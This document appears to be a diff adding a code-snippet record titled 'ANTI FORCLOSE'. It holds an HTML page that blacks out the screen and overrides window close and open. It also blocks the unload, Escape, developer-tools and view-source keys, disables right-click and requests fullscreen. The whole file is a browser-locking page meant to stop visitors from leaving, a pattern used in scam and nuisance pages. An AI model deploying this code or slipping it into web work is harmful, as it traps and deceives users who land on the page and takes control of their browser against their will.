@@ -1,0 +1,40 @@
+nama=ANTI FORCLOSE
+language=html
+lines=36
+date=26/11/2025
+code=<!DOCTYPE html>
+<html>
+<head>
+<style>
+body{
+margin:0;
+overflow:hidden;
+background:#000;
+}
+#overlay{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:#000;
+z-index:9999;
+}
+</style>
+</head>
+<body>
+<div id="overlay"></div>
+<script>
+window.open = function(){};
+window.close = function(){};
+window.onbeforeunload = function(){return false;};
+document.onkeydown = function(e){
+if(e.keyCode == 27 || e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)){
+return false;
+}
+};
+document.addEventListener('contextmenu', event => event.preventDefault());
+document.getElementById('overlay').requestFullscreen();
+</script>
+</body>
+</html>
